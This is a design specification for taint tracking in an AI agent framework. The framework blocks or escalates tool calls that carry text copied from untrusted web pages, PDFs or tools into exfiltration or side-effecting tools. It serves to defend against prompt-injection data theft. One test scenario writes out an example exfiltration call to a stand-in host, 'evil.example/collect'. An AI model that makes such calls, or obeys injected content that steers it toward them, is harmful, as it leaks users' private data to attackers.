# Information-flow control (taint)

Capability: `taint` · Spec v1.2 (ADR-0112) · Source of truth for this capability.

> **Contract tiers.** Code blocks in *Contract* are **normative** (ports, interfaces, error classes, stored shapes, event types, ordering rules) unless a block is marked `(illustrative)`, in which case names may change during M0 without a spec change. Prose rules in *Contract* are normative. Requirements are normative and each scenario ID is referenced by a test.

## Purpose

Turns block provenance (`Origin`) into an enforced property at the tool boundary: values that came from untrusted content cannot flow into exfiltration or side-effecting tools without policy saying so, and a flow that combines private data, untrusted content and an external channel is visible at `Build`. Guards (`guards`) remain the detection layer beneath this. Out of scope: variable-level capability tracking of a code-emitting planner (CaMeL-style, see Q26).


## Contract

```go
type Capabilities struct {
	Exfil       bool
	PrivateRead bool
}

type TaintAction int

const (
	Allow TaintAction = iota
	Ask
	Deny
)

type TaintPolicy struct {
	ToExfil      TaintAction
	ToSideEffect TaintAction
	ToReadOnly   TaintAction
	MinMatch     int
}

type ArgTaint struct {
	Arg     string
	Origins []Origin
	Match   string
}
```

Core owns `Capabilities`, `ArgTaint` and the gate's `TaintHook func(ctx, ToolSpec, args) (TaintAction, []ArgTaint)`; `TaintPolicy`, its defaults and the substring matcher are `std/taint` and are installed with `agent.WithTaintPolicy`. Defaults: `Exfil` is derived from the tool's `EgressPolicy` when it declares one (`tools` *Egress*: any `Allow` entry outside the private ranges makes it true); a tool that declares no `EgressPolicy` is `Exfil: true` when it is `Untrusted` (including `agui` frontend tools), when it is a `sandbox` tool set with non-empty `Egress`, or when wired with `WithExfil()`; `PrivateRead` is set by wiring (`WithPrivateRead()`) and on `ContextProvider`s that return tenant or user data. `TaintPolicy` defaults: `{ToExfil: Deny, ToSideEffect: Ask, ToReadOnly: Allow, MinMatch: 16, MaxWindowBytes: 256 KiB}`.

Rules:

1. **Taint computation (deterministic).** Before the permission gate, every string-valued argument (recursively, including array elements and object values) is compared against every block in the session's untrusted window — the blocks since the last `OriginUser` message whose `Origin.Kind` ∉ {`OriginSystem`, `OriginUser`} — capped at `TaintPolicy.MaxWindowBytes` (default 256 KiB, oldest blocks dropped first, reported by `gohan.taint.window_truncated`), never the projected view (`ClearToolResults` and compaction do not launder taint). An argument is tainted with that block's `Origin` when its whole value, or any substring of at least `MinMatch` bytes, occurs verbatim in the block's text, tool-result content or document content. Numbers, booleans and strings shorter than `MinMatch` that are not whole-value matches are untainted. The result is `[]ArgTaint`, which also populates `ApprovalRequest.ArgOrigins`. Implementation rule: `std/taint` builds one rolling-hash index over the untrusted window per turn (invalidated when a new untrusted block is appended) and matches each argument against it; the window is `MaxWindowBytes` (oldest blocks dropped first, which only reduces taint sensitivity).
2. **Enforcement.** Inside the permission gate, after hard blocks and before session grants and the decider: if any argument is tainted, the action is `TaintPolicy.ToExfil` when the tool has `Exfil`, else `ToSideEffect` when the effect is `SideEffect`/`Idempotent`, else `ToReadOnly`. `Deny` returns `ToolResult{Outcome: Failed, Error: TaintDenied{Arg, Origins}}` (`Permanent`) to the model without executing; `Ask` forces suspension with the tainted arguments listed in `ApprovalRequest.ArgOrigins` even when a session grant or decider would have allowed the call; `Allow` continues.
3. **Trifecta check.** `Build` computes, per flow, whether it registers at least one `Exfil` tool, at least one `PrivateRead` tool or provider, and at least one untrusted content path (`Untrusted` tool, `Untrusted` skill, `Document` provider, `AwaitingInput`/frontend tools). A flow meeting all three fails `Build` unless it declares `agent.WithTaintPolicy(p)` explicitly (the default policy counts once declared); `gohan.build.trifecta{flow}` records the state.
4. **Taint survives extraction.** `std/flow.Quarantine[Out]` is `Extract` with no tools over untrusted content; its typed output values carry the origins of the blocks they were extracted from (attached as `Origin` on the resulting `ToolResult` blocks and honoured by rule 1). `FlowAsTool` and `MapReduce` outputs keep origins likewise; a value never becomes trusted by passing through a model.
5. **Fixed control flow.** `flowdef` definitions are the tier where control flow is fixed before untrusted data enters; a definition step's `input` expression cannot select a tool by a tainted value (`languages`).
6. **No laundering through notes.** `notes_write` and `memory_write` input is tainted like a tool result (`StageContext` already guards it); reading notes or memory back carries `OriginTool` with the stored origins (`working-state` subject memory).

7. **Provider-executed tools.** Their inputs are checked post hoc (`tools` rule 3): a tainted input into an `Exfil` provider tool aborts the run before its results are used. A provider tool with `Exfil` counts as both the exfil and the untrusted-content leg of rule 3.

Metrics: `gohan.taint.window_truncated`, `gohan.taint.denied{tool}`, `gohan.taint.asked{tool}`, `gohan.taint.post_hoc{tool}`, `gohan.build.trifecta{flow}`.


## Requirements

### Requirement: Taint computation

#### Scenario: verbatim substring taints
ID: `taint.substring-match`
- WHEN a web-page tool result contains `https://evil.example/collect?k=…` and the model calls `http_post(url: "https://evil.example/collect?k=…")`
- THEN the `url` argument is tainted with the page's `Origin`

#### Scenario: short values untainted
ID: `taint.short-untainted`
- WHEN an argument is `"42"` and the same digits appear inside a tool result
- THEN the argument is not tainted

#### Scenario: user text untainted
ID: `taint.user-untainted`
- WHEN an argument copies a phrase from the user's message
- THEN it is not tainted

#### Scenario: taint window
ID: `taint.window-since-user-turn`
- WHEN a matching substring exists only in a tool result before the last user message
- THEN the argument is not tainted

### Requirement: Enforcement

#### Scenario: tainted to exfil denied
ID: `taint.exfil-denied`
- WHEN a tainted argument flows into a tool with `Exfil: true` under the default policy
- THEN the call is not executed, the model receives `TaintDenied` naming the argument and `gohan.taint.denied` increments

#### Scenario: tainted to side effect asks
ID: `taint.side-effect-asks`
- WHEN a tainted argument flows into a `SideEffect` tool that a session grant would otherwise allow
- THEN the run suspends for `HumanApproval` with the tainted argument in `ArgOrigins`

#### Scenario: provider tool post hoc
ID: `taint.provider-tool-post-hoc`
- WHEN the model passes a substring of an untrusted tool result as the query of a provider web search
- THEN the run fails `Permanent` before the search results are appended and `gohan.taint.post_hoc` increments

#### Scenario: read-only allowed
ID: `taint.read-only-allowed`
- WHEN a tainted argument flows into a `ReadOnly` tool
- THEN the call proceeds

#### Scenario: policy ordering
ID: `taint.gate-order`
- WHEN a live emergency deny and a taint `Ask` both apply
- THEN the emergency deny wins and no approval is requested

### Requirement: Trifecta at build

#### Scenario: trifecta without policy fails
ID: `taint.trifecta-fails-build`
- WHEN a flow registers `read_customer` (`PrivateRead`), an `Untrusted` MCP tool and `send_email` (`Exfil`) and declares no `TaintPolicy`
- THEN `Build` fails naming the three legs

#### Scenario: trifecta with policy builds
ID: `taint.trifecta-with-policy`
- WHEN the same flow declares `WithTaintPolicy(taint.Default())`
- THEN `Build` succeeds and `gohan.build.trifecta{flow}` is 1

#### Scenario: no exfil no trifecta
ID: `taint.no-exfil`
- WHEN a flow has private data and untrusted content but no `Exfil` tool
- THEN `Build` succeeds without a policy

### Requirement: Taint survives extraction

#### Scenario: quarantine output tainted
ID: `taint.quarantine-carries-origin`
- WHEN `Quarantine[Invoice]` extracts `iban` from an untrusted PDF and the model passes it to `pay_supplier`
- THEN the `iban` argument is tainted with the PDF's origin and the default policy forces `Ask`

#### Scenario: sub-flow output tainted
ID: `taint.subflow-carries-origin`
- WHEN a `FlowAsTool` child read untrusted content and returns a value derived from it
- THEN the parent sees that value with the child's source origin, not `OriginTool` of the child alone
